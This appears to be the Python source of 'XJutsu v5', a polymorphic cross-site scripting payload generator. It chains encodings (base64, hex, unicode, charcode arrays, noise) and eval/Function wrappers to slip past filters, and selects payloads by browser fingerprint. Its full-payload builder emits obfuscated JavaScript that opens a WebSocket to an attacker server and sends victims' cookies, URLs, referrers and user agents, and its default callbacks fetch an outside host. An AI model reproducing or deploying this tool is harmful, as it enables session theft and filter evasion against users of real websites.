"""
XJutsu v5 - Advanced Polymorphic Mutation Engine v3.5
by Dave Lester B. Mondina / ANBU Black Ops Security

Features:
- Multi-layer encoding chains
- Browser fingerprint-aware payload selection
- Random delimiter/noise injection
- Template-based mutation system
"""

import base64
import random
import string
import json
import hashlib
import urllib.parse
from pathlib import Path
from typing import Optional, Dict, List, Tuple


class Encoders:
    """Collection of encoding functions for payload mutation"""

    @staticmethod
    def b64_encode(s: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(s.encode()).decode()

    @staticmethod
    def b64_decode(s: str) -> str:
        """Base64 decoding"""
        return base64.b64decode(s.encode()).decode()

    @staticmethod
    def unicode_escape(s: str) -> str:
        """Unicode escape encoding (\uXXXX)"""
        return ''.join(f'\\u{ord(c):04x}' for c in s)

    @staticmethod
    def hex_escape(s: str) -> str:
        """Hex escape encoding (\xXX)"""
        return ''.join(f'\\x{ord(c):02x}' for c in s)

    @staticmethod
    def octal_escape(s: str) -> str:
        """Octal escape encoding (\XXX)"""
        return ''.join(f'\\{ord(c):03o}' for c in s)

    @staticmethod
    def url_encode(s: str) -> str:
        """URL encoding"""
        return urllib.parse.quote(s, safe='')

    @staticmethod
    def html_entity_encode(s: str) -> str:
        """HTML entity encoding (&#xXX;)"""
        return ''.join(f'&#x{ord(c):02x};' for c in s)

    @staticmethod
    def array_charcodes(s: str) -> str:
        """Convert to array of character codes"""
        return ','.join(str(ord(c)) for c in s)

    @staticmethod
    def split_random(s: str) -> Tuple[str, str]:
        """Split string with random delimiter"""
        delimiters = ['|', '~', '^', '#', '@', '!', '*', '+', '-', '_']
        delim = random.choice(delimiters)
        # Insert delimiter at random positions
        result = delim.join(list(s))
        return result, delim

    @staticmethod
    def reverse_string(s: str) -> str:
        """Reverse the string"""
        return s[::-1]

    @staticmethod
    def rot13(s: str) -> str:
        """ROT13 encoding"""
        result = []
        for c in s:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def noise_pad(length: int = 12) -> str:
        """Generate random noise padding"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def jsfuck_basic(s: str) -> str:
        """Basic JSFuck-style encoding (simplified)"""
        # This is a simplified version - real JSFuck is much longer
        mapping = {
            'a': '(!![]+[])[+!![]]',
            'l': '(![]+[])[!![]+!![]]',
            'e': '(!![]+[])[!![]+!![]+!![]]',
            'r': '(!![]+[])[+[]]',
            't': '(!![]+[])[+[]]',
        }
        # Only encode common chars, leave rest as-is for brevity
        return s  # Return as-is for now, full JSFuck would be too long


class BrowserDetector:
    """Detect browser type from User-Agent and headers"""

    BROWSER_PATTERNS = {
        'chrome': ['Chrome/', 'CriOS/', 'Chromium/'],
        'firefox': ['Firefox/', 'FxiOS/'],
        'safari': ['Safari/', 'Version/'],
        'edge': ['Edg/', 'Edge/'],
        'ie': ['MSIE ', 'Trident/'],
        'opera': ['OPR/', 'Opera/'],
        'electron': ['Electron/'],
        'webview_android': ['wv)', 'WebView'],
        'webview_ios': ['Mobile/', 'iPad', 'iPhone'],
    }

    @classmethod
    def detect(cls, user_agent: str, headers: Dict = None) -> str:
        """Detect browser type from User-Agent"""
        ua = user_agent.lower()
        headers = headers or {}

        # Check for Electron first (special case)
        if 'electron' in ua:
            return 'electron'

        # Check for WebViews
        if 'wv)' in ua or ('android' in ua and 'version/' in ua):
            return 'webview_android'

        if ('iphone' in ua or 'ipad' in ua) and 'safari' not in ua:
            return 'webview_ios'

        # Standard browsers
        if 'edg/' in ua or 'edge/' in ua:
            return 'edge'
        if 'opr/' in ua or 'opera/' in ua:
            return 'opera'
        if 'firefox/' in ua or 'fxios/' in ua:
            return 'firefox'
        if 'chrome/' in ua or 'crios/' in ua or 'chromium/' in ua:
            return 'chrome'
        if 'safari/' in ua:
            return 'safari'
        if 'msie ' in ua or 'trident/' in ua:
            return 'ie'

        return 'unknown'

    @classmethod
    def get_capabilities(cls, browser: str) -> Dict:
        """Get browser capabilities/features"""
        capabilities = {
            'chrome': {
                'es_modules': True,
                'websocket': True,
                'service_worker': True,
                'web_workers': True,
                'wasm': True,
                'pdf_viewer': True,
            },
            'firefox': {
                'es_modules': True,
                'websocket': True,
                'service_worker': True,
                'web_workers': True,
                'wasm': True,
                'svg_foreignobject': True,
            },
            'safari': {
                'es_modules': True,
                'websocket': True,
                'service_worker': True,
                'web_workers': True,
                'wasm': True,
                'websql': True,
            },
            'electron': {
                'node_integration': True,
                'require': True,
                'remote_module': True,
                'ipc': True,
            },
            'webview_android': {
                'javascript_interface': True,
                'file_access': True,
            },
            'webview_ios': {
                'webkit_messagehandlers': True,
                'prompt_bridge': True,
            },
        }
        return capabilities.get(browser, {})


class PolymorphicMutator:
    """Advanced polymorphic payload mutation engine"""

    def __init__(self, config_path: str = None):
        """Initialize with optional config file path"""
        self.config_path = config_path or Path(__file__).parent.parent / 'polymorphs.json'
        self.config = self._load_config()
        self.encoders = Encoders()
        self.browser_detector = BrowserDetector()

    def _load_config(self) -> Dict:
        """Load polymorphic templates from JSON config"""
        try:
            with open(self.config_path, 'r') as f:
                return json.load(f)
        except Exception:
            return {'polymorphic_payloads': [], 'browser_specific': {}, 'encoding_chains': []}

    def _apply_encoder(self, data: str, encoder: str) -> str:
        """Apply a single encoder to data"""
        encoders_map = {
            'b64': self.encoders.b64_encode,
            'unicode_escape': self.encoders.unicode_escape,
            'hex_escape': self.encoders.hex_escape,
            'octal_escape': self.encoders.octal_escape,
            'url_encode': self.encoders.url_encode,
            'html_entity': self.encoders.html_entity_encode,
            'array_charcodes': self.encoders.array_charcodes,
            'reverse': self.encoders.reverse_string,
            'rot13': self.encoders.rot13,
        }
        encoder_fn = encoders_map.get(encoder)
        if encoder_fn:
            return encoder_fn(data)
        return data

    def _apply_chain(self, data: str, chain: List[str]) -> str:
        """Apply a chain of encoders"""
        result = data
        for encoder in chain:
            result = self._apply_encoder(result, encoder)
        return result

    def mutate_template(self, template: Dict, domain: str, token: str, body: str = None) -> str:
        """Mutate a single template with encodings"""
        tpl = template['template']
        encoder = template.get('encoder', 'plain')

        # Default callback body
        if body is None:
            body = f"fetch('https://{domain}/api/callback?t={token}')"

        # Apply encoder based on type
        if encoder == 'b64':
            return tpl.replace('{{b64}}', self.encoders.b64_encode(body))

        elif encoder == 'unicode_escape':
            return tpl.replace('{{ue}}', self.encoders.unicode_escape(body))

        elif encoder == 'hex_escape':
            return tpl.replace('{{hex}}', self.encoders.hex_escape(body))

        elif encoder == 'split_random':
            chunks, delim = self.encoders.split_random(body)
            return tpl.replace('{{chunked}}', chunks).replace('{{delim}}', delim)

        elif encoder == 'array_charcodes':
            return tpl.replace('{{arr}}', self.encoders.array_charcodes(body))

        elif encoder == 'noise':
            return (tpl
                .replace('{{noise1}}', self.encoders.noise_pad(random.randint(8, 20)))
                .replace('{{noise2}}', self.encoders.noise_pad(random.randint(8, 20)))
                .replace('{{body}}', body))

        elif encoder == 'url_encode':
            return tpl.replace('{{ue}}', self.encoders.url_encode(body))

        elif encoder == 'plain':
            return tpl.replace('{{body}}', body)

        elif encoder == 'none':
            return (tpl
                .replace('{{domain}}', domain)
                .replace('{{token}}', token))

        return tpl.replace('{{body}}', body)

    def generate_random(self, domain: str, token: str = None, body: str = None) -> str:
        """Generate a random polymorphic payload"""
        if not token:
            token = 't' + hashlib.md5(str(random.random()).encode()).hexdigest()[:8]

        templates = self.config.get('polymorphic_payloads', [])
        if not templates:
            # Fallback if no config
            return f"fetch('https://{domain}/api/callback?t={token}')"

        template = random.choice(templates)
        return self.mutate_template(template, domain, token, body)

    def generate_for_browser(self, browser: str, domain: str, token: str = None) -> str:
        """Generate browser-specific payload"""
        if not token:
            token = 't' + hashlib.md5(str(random.random()).encode()).hexdigest()[:8]

        browser_payloads = self.config.get('browser_specific', {}).get(browser, [])

        if browser_payloads:
            template = random.choice(browser_payloads)
            payload = template['payload']
            return (payload
                .replace('{{domain}}', domain)
                .replace('{{token}}', token)
                .replace('{{body}}', f"fetch('https://{domain}/api/callback?t={token}')"))

        # Fallback to random polymorphic
        return self.generate_random(domain, token)

    def generate_chained(self, domain: str, token: str = None, chain: List[str] = None) -> str:
        """Generate payload with chained encodings"""
        if not token:
            token = 't' + hashlib.md5(str(random.random()).encode()).hexdigest()[:8]

        # Use random chain if not specified
        if chain is None:
            chains = self.config.get('encoding_chains', [['b64']])
            chain = random.choice(chains)

        body = f"fetch('https://{domain}/api/callback?t={token}')"
        encoded = self._apply_chain(body, chain)

        # Wrap in eval/Function based on encoding
        if 'b64' in chain:
            return f"eval(atob('{encoded}'))"
        elif 'hex_escape' in chain or 'unicode_escape' in chain:
            return f"eval('{encoded}')"
        else:
            return f"Function('{encoded}')()"

    def generate_full_payload(self, server_url: str, ws_url: str, payload_id: str = None,
                               user_agent: str = None) -> str:
        """Generate a complete polymorphic XSS payload"""
        # Detect browser if user agent provided
        browser = 'unknown'
        if user_agent:
            browser = self.browser_detector.detect(user_agent)

        # Random variable names
        v_loaded = self._random_var()
        v_ws = self._random_var()
        v_bot = self._random_var()
        v_send = self._random_var()
        v_retry = self._random_var()
        v_connect = self._random_var()

        # Random IIFE style
        iife_styles = [
            ("(function(){", "})();"),
            ("!function(){", "}();"),
            ("+function(){", "}();"),
            ("~function(){", "}();"),
            ("void function(){", "}();"),
            ("(()=>{", "})();"),
        ]
        iife_start, iife_end = random.choice(iife_styles)

        # Random window reference
        win_refs = ['window', 'self', 'globalThis', 'this']
        win = random.choice(win_refs)

        # Random WebSocket URL encoding
        ws_encoded = random.choice([
            f"'{ws_url}'",
            self._encode_string_random(ws_url),
        ])

        # Random bot ID generation
        bot_gens = [
            "Math.random().toString(36).slice(2)+Math.random().toString(36).slice(2)",
            "(+new Date).toString(36)+Math.random().toString(36).slice(2,10)",
            "crypto.randomUUID?crypto.randomUUID().slice(0,16):Math.random().toString(36).slice(2)",
        ]
        bot_gen = random.choice(bot_gens)

        # Random noise comments
        noise1 = f"/*{self.encoders.noise_pad(random.randint(5, 15))}*/" if random.random() > 0.5 else ""
        noise2 = f"/*{self.encoders.noise_pad(random.randint(5, 15))}*/" if random.random() > 0.5 else ""

        # Build payload
        payload = f"""{noise1}{iife_start}
if({win}.{v_loaded})return;{win}.{v_loaded}=1;
var {v_bot}={bot_gen};
var {v_retry}=0;
var {v_ws};
function {v_connect}(){{
{v_ws}=new WebSocket({ws_encoded});
{v_ws}.onopen=function(){{
{v_retry}=0;
{v_ws}.send(JSON.stringify({{type:'register',bot_id:{v_bot}}}));
{v_ws}.send(JSON.stringify({{
type:'callback',
payload:{{
payload_id:'{payload_id or ''}',
bot_id:{v_bot},
uri:{win}.location.href,
origin:{win}.location.origin,
referrer:document.referrer,
cookies:document.cookie,
browser:'{browser}',
user_agent:navigator.userAgent
}}
}}));
}};
{v_ws}.onclose=function(){{
if({v_retry}<10){{
{v_retry}++;
setTimeout({v_connect},1000*{v_retry});
}}
}};
}}
{v_connect}();
{iife_end}{noise2}"""

        return payload

    def _random_var(self, length: int = 6) -> str:
        """Generate random variable name"""
        prefixes = ['_', '$', '__', '_$', '$_', '_0x']
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices(string.ascii_letters, k=length))
        return f"{prefix}{suffix}"

    def _encode_string_random(self, s: str) -> str:
        """Randomly encode a string"""
        encoders = [
            lambda x: f"atob('{self.encoders.b64_encode(x)}')",
            lambda x: f"'{self.encoders.hex_escape(x)}'",
            lambda x: f"'{self.encoders.unicode_escape(x)}'",
            lambda x: f"[{self.encoders.array_charcodes(x)}].map(c=>String.fromCharCode(c)).join('')",
        ]
        return random.choice(encoders)(s)


# Convenience functions
def mutate(payload: Dict, domain: str = "6u.gg", token: str = None) -> str:
    """Quick mutation function"""
    mutator = PolymorphicMutator()
    return mutator.mutate_template(payload, domain, token or f"t{random.randint(10000,99999)}")


def generate_poly(domain: str = "6u.gg", token: str = None, browser: str = None) -> str:
    """Generate polymorphic payload"""
    mutator = PolymorphicMutator()
    if browser:
        return mutator.generate_for_browser(browser, domain, token)
    return mutator.generate_random(domain, token)


def generate_full(server_url: str, ws_url: str, payload_id: str = None, user_agent: str = None) -> str:
    """Generate full polymorphic callback payload"""
    mutator = PolymorphicMutator()
    return mutator.generate_full_payload(server_url, ws_url, payload_id, user_agent)
